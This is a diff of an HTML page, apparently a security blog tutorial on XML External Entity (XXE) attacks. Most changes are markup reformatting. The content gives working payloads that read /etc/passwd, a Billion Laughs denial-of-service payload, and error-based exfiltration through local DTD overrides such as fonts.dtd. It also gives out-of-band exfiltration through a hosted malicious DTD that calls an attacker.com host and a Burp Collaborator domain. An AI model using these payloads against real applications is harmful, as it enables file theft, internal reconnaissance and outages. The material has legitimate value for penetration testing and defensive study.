@@ -50,39 +50,41 @@
 
   <div class="article-content">
     <h1 id="context-of-xxe">Context of XXE</h1>
-<p>Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. In the past, XML was the most reliable way of processing and storing complex data structures. Now a days we have other and more efficient ways of processing data as it may be JSON, but due to the inheritance of XML many products use it. XML provides some key benefits that support its usage in modern applications:
-1. <strong>Flexibility</strong>: XML by design adapts to many different data types and structures since it allows to create custom tags. This is very convenient for managing great amounts of data since you can define an XML Schema Definition (XSD) and a Document Type Definition (DTD) to structure and process the data. 
-2. <strong>Platform independence</strong>: XML is based on plain text files which allows any operating system to support it. This make it very convenient for cross-platform solutions in which the data must be accessed from different sources. Additionally, many programing languages support the XML format so the data can be transformed, edited and processed internally by the core of the applications. 
-3. <strong>Industry Adoption and Standardization</strong>: The World Wide Web Consortium (W3C) has established standards for XML, ensuring consistent implementation and interoperability across different systems and platforms. This industry-wide standardization of XML further enhances its credibility and usability as a preferred choice for data storage interoperability.</p>
+<p>Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. In the past, XML was the most reliable way of processing and storing complex data structures. Now a days we have other and more efficient ways of processing data as it may be JSON, but due to the inheritance of XML many products use it. XML provides some key benefits that support its usage in modern applications:</p>
+<ol>
+<li><strong>Flexibility</strong>: XML by design adapts to many different data types and structures since it allows to create custom tags. This is very convenient for managing great amounts of data since you can define an XML Schema Definition (XSD) and a Document Type Definition (DTD) to structure and process the data.</li>
+<li><strong>Platform independence</strong>: XML is based on plain text files which allows any operating system to support it. This make it very convenient for cross-platform solutions in which the data must be accessed from different sources. Additionally, many programing languages support the XML format so the data can be transformed, edited and processed internally by the core of the applications.</li>
+<li><strong>Industry Adoption and Standardization</strong>: The World Wide Web Consortium (W3C) has established standards for XML, ensuring consistent implementation and interoperability across different systems and platforms. This industry-wide standardization of XML further enhances its credibility and usability as a preferred choice for data storage interoperability.</li>
+</ol>
 <h2 id="what-is-it">What is it</h2>
 <p>An XML External Entity attack is a type of attack against an application that parses non-validated XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Those external entities are defined by the attacker and they can lead to several side effects like data exfiltration or DoS attacks.
-<strong>Example of external entity</strong>:
+<strong>Example of external entity</strong>:</p>
 <pre class="highlight"><code class="language-XML">&lt;!--?xml version="1.0" ?--&gt;
 &lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;
  &lt;userInfo&gt;
   &lt;firstName&gt;John&lt;/firstName&gt;
   &lt;lastName&gt;&amp;example;&lt;/lastName&gt;
  &lt;/userInfo&gt;</code></pre>
-In this example the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element.</p>
+<p>In this example the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element.</p>
 <h2 id="requirements">Requirements</h2>
-<p>The XXE attacks requires from the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parser by default require the developer to limit their capabilities by setting different flags in the component that uses it. </p>
+<p>The XXE attacks requires from the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parser by default require the developer to limit their capabilities by setting different flags in the component that uses it.</p>
 <hr />
 <h1 id="security-risks-and-impacts">Security risks and impacts</h1>
 <p>The main impact of the XXE vulnerabilities is produced in the data stored in the server. XXE is a very common data exfiltration attack vector since not only it can read data stored in the affected server, the XXE attack vector can create connections to other systems and leak data to external sources, leading to internal fingerprinting and giving the attacker information to design more complex chained vectors that may impact other resources in the corporate ecosystem.</p>
 <h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
-<p>XML LFI payloads usually result on the application returning the contents of the file requested. 
+<p>XML LFI payloads usually result on the application returning the contents of the file requested.</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ELEMENT foo ANY&gt;
 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
-In this payload, the entity "xxe" will return the content of the file <code>/etc/passwd</code> since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data. </p>
+<p>In this payload, the entity "xxe" will return the content of the file <code>/etc/passwd</code> since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.</p>
 <h2 id="server-side-request-forgery-ssrf-out-of-band-oob">Server Side Request Forgery (SSRF) / Out-of-Band (OOB)</h2>
-<p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally. One variant of this attack also leads into OOB attacks when the firewall protection of the affected application is poor. OOB allows the attacker to perform connections to third-party sources (mainly attacker controlled servers) which allows the delivery of malicious content that can interact with the vulnerable server. 
-In some cases where the direct LFI is not possible, the attacker may use above techniques to exfiltrate data to some controlled server. 
+<p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally. One variant of this attack also leads into OOB attacks when the firewall protection of the affected application is poor. OOB allows the attacker to perform connections to third-party sources (mainly attacker controlled servers) which allows the delivery of malicious content that can interact with the vulnerable server.
+In some cases where the direct LFI is not possible, the attacker may use above techniques to exfiltrate data to some controlled server.
 <a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">What is a blind XXE attack? Tutorial &amp; Examples | Web Security Academy</a></p>
 <h2 id="resource-exhaustion-dos">Resource Exhaustion (DoS)</h2>
-<p>XML has a feature that allows to expand entities in a recursive way by referencing them in loop. While this cannot be considered an external entity attack, worth mentioning it due to the impact that may cause in the application. If the parser is not well configured those entities will kept being called until the application consume their resources. The most famous resource exhaustion attack is the Billion Laughs DoS. While this attack is mostly mitigated in modern XML parsers, it provides very useful context on how XML works.
+<p>XML has a feature that allows to expand entities in a recursive way by referencing them in loop. While this cannot be considered an external entity attack, worth mentioning it due to the impact that may cause in the application. If the parser is not well configured those entities will kept being called until the application consume their resources. The most famous resource exhaustion attack is the Billion Laughs DoS. While this attack is mostly mitigated in modern XML parsers, it provides very useful context on how XML works.</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="utf-8"?&gt;
 &lt;!DOCTYPE laugh [
     &lt;!ELEMENT laugh ANY&gt;
@@ -92,14 +94,14 @@ In some cases where the direct LFI is not possible, the attacker may use above t
     &lt;!ENTITY LOL3 "&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;"&gt;
 ]&gt;
 &lt;laugh&gt;&amp;LOL3;&lt;/laugh&gt;</code></pre>
-Above payload makes the XML parser to expands each of the entities, generating a large number of “LOLs”. Above payload would generate hundred of thousands "LOL" strings but a full scale payload would generate literally "Billions" of "LOL" string.</p>
+<p>Above payload makes the XML parser to expands each of the entities, generating a large number of “LOLs”. Above payload would generate hundred of thousands "LOL" strings but a full scale payload would generate literally "Billions" of "LOL" string.</p>
 <h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
 <p>In some environments XXE attacks may allow the attacker to perform RCE. By design, XML does not allow directly to execute code and most XXE attacks that lead to RCE rely on internal programing languages protocols (like php:). This attack vector requires of a thorough recognition of the affected system to identify compatible tools that may allow this chain attack.</p>
 <hr />
 <h1 id="identifying-xxe-on-rest-apis">Identifying XXE on REST APIs</h1>
 <p>The only way to properly identify if an application is vulnerable to XXE is by exploiting it. To minimize the risk of information leak and damage de server we can try to either reflect a string coming from external entity or read a harmless file like hosts file.</p>
-<p>Some scenarios would require from further testing since the entry point of the attack would not properly reflect our payload in the response. In this kind of scenarios we can rely on errors coming from the application to identify the exploitability. </p>
-<p>Lets say we have the following payload:
+<p>Some scenarios would require from further testing since the entry point of the attack would not properly reflect our payload in the response. In this kind of scenarios we can rely on errors coming from the application to identify the exploitability.</p>
+<p>Lets say we have the following payload:</p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -107,7 +109,7 @@ Above payload makes the XML parser to expands each of the entities, generating a
 &lt;root&gt;
 &lt;data&gt;&amp;xxe;&lt;/data&gt;
 &lt;/root&gt;</code></pre>
-The behavior expected with this payload would be that the response contains a copy of the data of <code>/etc/passwd</code>, but if the response does not return anything or it does not contain <code>/etc/passwd</code> we can try to send a malformed entity to trigger a protocol error.
+<p>The behavior expected with this payload would be that the response contains a copy of the data of <code>/etc/passwd</code>, but if the response does not return anything or it does not contain <code>/etc/passwd</code> we can try to send a malformed entity to trigger a protocol error.</p>
 <pre class="highlight"><code class="language-XML">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "sdjsd:///etc/passwd"&gt; ]&gt;
 &lt;contacts&gt;
   &lt;contact&gt;
@@ -118,8 +120,8 @@ The behavior expected with this payload would be that the response contains a co
     &lt;city&gt;Paris&lt;/city&gt;
   &lt;/contact&gt;
 &lt;/contacts&gt;</code></pre>
-In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.</p>
-<p>Another method that may worth trying (but is more noisy than the above mentioned) is to try a basic OOB connection to a server controlled by us. In this scenario we may face some limitations due to possible network restrictions (firewall blocking connections to external sources, SIEM detections, etc). Additionally, we can also trigger errors by malforming the resource declaration as follows:
+<p>In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.</p>
+<p>Another method that may worth trying (but is more noisy than the above mentioned) is to try a basic OOB connection to a server controlled by us. In this scenario we may face some limitations due to possible network restrictions (firewall blocking connections to external sources, SIEM detections, etc). Additionally, we can also trigger errors by malforming the resource declaration as follows:</p>
 <pre class="highlight"><code class="language-XML">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "http:/Attacker server"&gt; ]&gt;
 &lt;contacts&gt;
   &lt;contact&gt;
@@ -130,7 +132,7 @@ In a real exploitation use case, this payload triggered an "Unknown protocol: sd
     &lt;city&gt;Paris&lt;/city&gt;
   &lt;/contact&gt;
 &lt;/contacts&gt;</code></pre>
-In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned "protocol = http host = null" meaning that the entity got properly resolved.</p>
+<p>In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned "protocol = http host = null" meaning that the entity got properly resolved.</p>
 <p>The last and most extreme case would be that the application target does not return any error information at all and it does not print the injected entities in the response. In this case we can either try an OOB connection or analyze the application behavior. Let say the target application returns 200 ok with the legitimate request and when trying to exfiltrate the /etc/passwd returns nothing but 200 ok. The most common behavior will be that if the malicious XML triggers an error we see a 500 error. At this step we have to be very careful to avoid errors resulting from XML syntax errors. With a well formed XML structure we can ensure that the errors come from the malicious actions we define.</p>
 <hr />
 <h1 id="advanced-techniques">Advanced techniques</h1>
@@ -140,7 +142,7 @@ In this case we can see that the URL is malformed and in the same real exploitat
 </ul>
 <h2 id="data-exfiltration-trough-local-system-dtds-on-blind-xxe">Data exfiltration trough local system DTDs on blind XXE</h2>
 <p>There are many ways to exfiltrate data using <strong>XXE (XML External Entity)</strong> attacks. However, in some cases, the most common techniques, such as directly including file contents in the XML response, are not enough to successfully read sensitive files. This often happens when the application’s default behavior only prints <strong>error-related information</strong> instead of the actual file content.</p>
-<p>For example, if the application returns error messages like these:
+<p>For example, if the application returns error messages like these:</p>
 <pre class="highlight"><code class="language-json">{
   "REDACTED": "REDACTED",
   "errorMessage": "/etc/invalid-file (No such file or directory)"
@@ -149,32 +151,39 @@ In this case we can see that the URL is malformed and in the same real exploitat
   "REDACTED": "REDACTED",
   "errorMessage": "/etc/shadow (Permission denied)"
 }</code></pre>
-This indicates that the XML parser is attempting to access the specified files and reporting filesystem errors. If we can trigger these errors, we can use them to <strong>enumerate the filesystem</strong> checking which files exist and which do not.</p>
+<p>This indicates that the XML parser is attempting to access the specified files and reporting filesystem errors. If we can trigger these errors, we can use them to <strong>enumerate the filesystem</strong> checking which files exist and which do not.</p>
 <h3 id="why-enumerate-the-filesystem">Why Enumerate the Filesystem?</h3>
-<p>The goal of enumerating the filesystem is to locate <strong>default DTD files</strong> present on the system. These files can be leveraged to perform advanced XXE attacks because they often:
-- Define <strong>parameter entities</strong> that can be overridden.
-- Allow us to inject our own entities to manipulate output and include file contents indirectly.</p>
+<p>The goal of enumerating the filesystem is to locate <strong>default DTD files</strong> present on the system. These files can be leveraged to perform advanced XXE attacks because they often:</p>
+<ul>
+<li>Define <strong>parameter entities</strong> that can be overridden.</li>
+<li>Allow us to inject our own entities to manipulate output and include file contents indirectly.</li>
+</ul>
 <h3 id="attack-foundation">Attack Foundation</h3>
-<p>The core idea is simple:
-- Use a <strong>pre-existing DTD</strong> on the system.
-- Override its parameter entities to include the contents of a target file.</p>
+<p>The core idea is simple:</p>
+<ul>
+<li>Use a <strong>pre-existing DTD</strong> on the system.</li>
+<li>Override its parameter entities to include the contents of a target file.</li>
+</ul>
 <p>To enumerate the filesystem, we can use wordlists containing common DTD paths. Once we find a suitable DTD, the attack proceeds by redefining entities and chaining them to exfiltrate data.</p>
 <h3 id="example-fontsdtd">Example: fonts.dtd</h3>
-<p>One commonly available DTD is <code>fonts.dtd</code>, located at: 
+<p>One commonly available DTD is <code>fonts.dtd</code>, located at:</p>
 <pre class="highlight"><code>/usr/share/xml/fontconfig/fonts.dtd</code></pre>
-This file defines several parameter entities that can be overridden, making it a good candidate for this technique.</p>
+<p>This file defines several parameter entities that can be overridden, making it a good candidate for this technique.</p>
 <h3 id="exploitation-example-using-fontsdtd">Exploitation Example Using fonts.dtd</h3>
 <ul>
 <li><strong>Step 1:</strong> Load the Local DTD:
-We start by referencing the local DTD in our XML payload:
+We start by referencing the local DTD in our XML payload:</li>
+</ul>
 <pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
   &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;
   %local_dtd;
 ]&gt;
 &lt;message&gt;&lt;/message&gt;</code></pre>
-This ensures the parser loads and processes the existing DTD definitions.</li>
+<p>This ensures the parser loads and processes the existing DTD definitions.</p>
+<ul>
 <li><strong>Step 2:</strong> Override Parameter Entities:
-<code>fonts.dtd</code> defines entities like <code>%expr</code> that can be overridden. We redefine them to include our malicious logic:
+<code>fonts.dtd</code> defines entities like <code>%expr</code> that can be overridden. We redefine them to include our malicious logic:</li>
+</ul>
 <pre class="highlight"><code class="language-xml">&lt;!DOCTYPE message [
     &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"&gt;
     &lt;!ENTITY % expr 'aaa)&gt;
@@ -185,15 +194,20 @@ This ensures the parser loads and processes the existing DTD definitions.</li>
         &lt;!ELEMENT aa (bb'&gt;%local_dtd;
 ]&gt;
 &lt;message&gt;&lt;/message&gt;</code></pre>
-<strong>Explanation:</strong></li>
+<p><strong>Explanation:</strong></p>
+<ol>
 <li><code>%file</code> loads the contents of <code>/etc/passwd</code> from the local filesystem.</li>
 <li><code>%eval</code> creates a new parameter entity <code>%error</code> that references a non-existent file path concatenated with <code>%file</code> content.</li>
-<li>When the parser expands <code>%error</code>, it attempts to resolve the invalid path, triggering an error message that includes the contents of <code>/etc/passwd</code>.</li>
-<li><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
-If the application returns error messages, the response will include something like:
+<li>
+<p>When the parser expands <code>%error</code>, it attempts to resolve the invalid path, triggering an error message that includes the contents of <code>/etc/passwd</code>.</p>
+</li>
+<li>
+<p><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
+If the application returns error messages, the response will include something like:</p>
+</li>
+</ol>
 <pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
-This leaks the contents of <code>/etc/passwd</code> through the error message.</li>
-</ul>
+<p>This leaks the contents of <code>/etc/passwd</code> through the error message.</p>
 <h3 id="why-this-works">Why This Works</h3>
 <ul>
 <li>We use a <strong>local DTD</strong> to bypass network restrictions.</li>
@@ -201,53 +215,84 @@ This leaks the contents of <code>/etc/passwd</code> through the error message.</
 <li>We exploit <strong>error-based disclosure</strong> to exfiltrate data without direct file inclusion.</li>
 </ul>
 <p>Creating a working payload for local DTD-based XXE exploitation requires careful attention to XML and DTD parsing rules. Below are the key requirements:</p>
-<h4 id="1-valid-dtd-structure">1. Valid DTD Structure</h4>
-<ul>
-<li>The injected payload must maintain a syntactically valid DTD.</li>
+<ol>
+<li>
+<p>Valid DTD Structure</p>
+</li>
+<li>
+<p>The injected payload must maintain a syntactically valid DTD.</p>
+</li>
 <li>All markup declarations (<code>&lt;!ELEMENT&gt;</code>, <code>&lt;!ENTITY&gt;</code>) must appear in a proper order.</li>
-<li>If the included DTD (<code>%local_dtd;</code>) contains markup declarations, use a <strong>dummy element</strong> (e.g., <code>&lt;!ELEMENT aa (bb'&gt;</code>) to absorb conflicts and prevent parser errors.</li>
-</ul>
-<h4 id="2-correct-entity-nesting-and-escaping">2. Correct Entity Nesting and Escaping</h4>
-<ul>
-<li>Nested entity declarations inside another entity must be properly escaped:
+<li>
+<p>If the included DTD (<code>%local_dtd;</code>) contains markup declarations, use a <strong>dummy element</strong> (e.g., <code>&lt;!ELEMENT aa (bb'&gt;</code>) to absorb conflicts and prevent parser errors.</p>
+</li>
+<li>
+<p>Correct Entity Nesting and Escaping</p>
+</li>
+<li>
+<p>Nested entity declarations inside another entity must be properly escaped:
   - Use <code>&amp;#x25;</code> for <code>%</code>, <code>&amp;#x26;</code> for <code>&amp;</code> and <code>&amp;#x27;</code> for quotes.
-  - Example:</li>
-</ul>
-<p><pre class="highlight"><code class="language-xml">    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///path/%file;'&gt;"&gt;</code></pre>
-- Failure to escape these characters often results in <strong>markup declaration errors</strong>.</p>
-<h4 id="3-order-of-expansion">3. Order of Expansion</h4>
-<ul>
-<li>Define and expand entities in the correct sequence:</li>
+  - Example:
+            <code>xml
+            &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///path/%file;'&gt;"&gt;</code></p>
+</li>
+<li>
+<p>Failure to escape these characters often results in <strong>markup declaration errors</strong>.</p>
+</li>
+<li>
+<p>Order of Expansion</p>
+</li>
+<li>
+<p>Define and expand entities in the correct sequence:</p>
+</li>
 <li>Override entities first.</li>
 <li>Expand <code>%eval;</code> and <code>%error;</code> before including <code>%local_dtd;</code>.</li>
-<li>Incorrect ordering can cause the parser to reject the payload.</li>
-</ul>
-<h4 id="4-include-a-structural-padding">4. Include a Structural Padding</h4>
+<li>
+<p>Incorrect ordering can cause the parser to reject the payload.</p>
+</li>
+<li>
+<p>Include a Structural Padding</p>
+</li>
+<li>
+<p>When including external DTDs, add a placeholder declaration like:</p>
+</li>
+</ol>
+<pre class="highlight"><code class="language-xml">  &lt;!ELEMENT aa (bb'&gt;</code></pre>
 <ul>
-<li>When including external DTDs, add a placeholder declaration like:</li>
-</ul>
-<p><pre class="highlight"><code class="language-xml">  &lt;!ELEMENT aa (bb'&gt;</code></pre>
-- This prevents syntax conflicts when the external DTD introduces new declarations.</p>
-<h4 id="5-use-parameter-entities-for-injection">5. Use Parameter Entities for Injection</h4>
-<ul>
-<li>Always use <strong>parameter entities</strong> (<code>%</code>) for overriding and chaining.</li>
+<li>
+<p>This prevents syntax conflicts when the external DTD introduces new declarations.</p>
+</li>
+<li>
+<p>Use Parameter Entities for Injection</p>
+</li>
+<li>
+<p>Always use <strong>parameter entities</strong> (<code>%</code>) for overriding and chaining.</p>
+</li>
 <li>Example:</li>
 </ul>
 <pre class="highlight"><code class="language-xml">  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code></pre>
-<h4 id="6-error-based-exfiltration-logic">6. Error-Based Exfiltration Logic</h4>
-<ul>
-<li>Ensure the payload triggers an error that includes the file content:</li>
+<ol>
+<li>
+<p>Error-Based Exfiltration Logic</p>
+</li>
+<li>
+<p>Ensure the payload triggers an error that includes the file content:</p>
+</li>
 <li>Reference a non-existent file concatenated with the target file content.</li>
-<li>Example:
-<pre class="highlight"><code class="language-xml">    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;</code></pre></li>
-</ul>
-<h4 id="7-compatibility-with-target-dtd">7. Compatibility with Target DTD</h4>
-<ul>
-<li>The chosen local DTD must allow parameter entity overrides.</li>
+<li>Example:</li>
+</ol>
+<pre class="highlight"><code class="language-xml">    &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;</code></pre>
+<ol>
+<li>
+<p>Compatibility with Target DTD</p>
+</li>
+<li>
+<p>The chosen local DTD must allow parameter entity overrides.</p>
+</li>
 <li>Common candidates: <code>fonts.dtd</code>, <code>docbook.dtd</code>, <code>jspxml.dtd</code></li>
-</ul>
+</ol>
 <h3 id="bonus-track">Bonus track</h3>
-<p>The same way we can read files by attaching its content to the error message, we can twist the payload a little bit to enumerate other internal services. In stead of defining <code>file:///etc/passwd</code> we can define connections to internal resources and read the responses from it (for example an admin dashboard hosted in http://localhost:8080).</p>
+<p>The same way we can read files by attaching its content to the error message, we can twist the payload a little bit to enumerate other internal services. In stead of defining <code>file:///etc/passwd</code> we can define connections to internal resources and read the responses from it (for example an admin dashboard hosted in <a href="http://localhost:8080">http://localhost:8080</a>).</p>
 <h2 id="oob-lfi-using-malicious-dtds">OOB LFI using malicious DTDs</h2>
 <p>There are many ways to exfiltrate data using <strong>XXE (XML External Entity)</strong> attacks. However, in some cases, the most common techniques, such as directly including file contents in the XML response, are not enough to successfully read sensitive files. This often happens when the application does not return entity expansions in its response, making the vulnerability <strong>blind</strong>.</p>
 <p>In these cases, attackers can use <strong>out-of-band (OOB) techniques</strong> to exfiltrate data by forcing the server to make network requests to an attacker-controlled system. This method does not rely on the application’s response, making it effective even when the output is suppressed.</p>
@@ -269,11 +314,13 @@ This leaks the contents of <code>/etc/passwd</code> through the error message.</
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://&lt;your-collaborator-id&gt;.oastify.com/?x=%file;'&gt;"&gt;
 %eval;
 %exfiltrate;</code></pre>
-<p><strong>Explanation:</strong>
-- <code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code> tells the parser to load the contents of <code>/etc/passwd</code> into the entity <code>%file</code>.
-- <code>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://&lt;your-collaborator-id&gt;.oastify.com/?x=%file;'&gt;"&gt;</code> creates a new entity declaration inside <code>%eval</code>. The <code>&amp;#x25;</code> is the escaped form of <code>%</code>, required because we are defining a parameter entity inside another entity.
-- <code>%eval;</code> expands and defines <code>%exfiltrate</code>.
-- <code>%exfiltrate;</code> triggers the HTTP request to the attacker’s server, sending the file contents as part of the query string.</p>
+<p><strong>Explanation:</strong></p>
+<ul>
+<li><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</code> tells the parser to load the contents of <code>/etc/passwd</code> into the entity <code>%file</code>.</li>
+<li><code>&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://&lt;your-collaborator-id&gt;.oastify.com/?x=%file;'&gt;"&gt;</code> creates a new entity declaration inside <code>%eval</code>. The <code>&amp;#x25;</code> is the escaped form of <code>%</code>, required because we are defining a parameter entity inside another entity.</li>
+<li><code>%eval;</code> expands and defines <code>%exfiltrate</code>.</li>
+<li><code>%exfiltrate;</code> triggers the HTTP request to the attacker’s server, sending the file contents as part of the query string.</li>
+</ul>
 <p><strong>Why escape characters?</strong> XML parsers enforce strict syntax rules. When nesting declarations, <code>%</code> must be escaped as <code>&amp;#x25;</code> to avoid breaking the DTD structure.</p>
 <h4 id="step-2-host-the-malicious-dtd">Step 2: Host the Malicious DTD</h4>
 <p>Once the malicious DTD is created, host it on a server reachable by the target application. A simple Python HTTP server works:</p>
@@ -286,9 +333,11 @@ This leaks the contents of <code>/etc/passwd</code> through the error message.</
   %remote;
 ]&gt;
 &lt;message&gt;bar&lt;/message&gt;</code></pre>
-<p><strong>Explanation:</strong>
-- <code>&lt;!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"&gt;</code> instructs the parser to fetch the malicious DTD.
-- <code>%remote;</code> expands the content of the malicious DTD, executing the exfiltration logic.</p>
+<p><strong>Explanation:</strong></p>
+<ul>
+<li><code>&lt;!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"&gt;</code> instructs the parser to fetch the malicious DTD.</li>
+<li><code>%remote;</code> expands the content of the malicious DTD, executing the exfiltration logic.</li>
+</ul>
 <p><strong>Tip:</strong> Use an IP address if DNS resolution is unreliable. Ensure the protocol (HTTP/HTTPS) matches what the target can access.</p>
 <h4 id="step-4-monitor-oob-interaction">Step 4: Monitor OOB Interaction</h4>
 <p>Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation.</p>
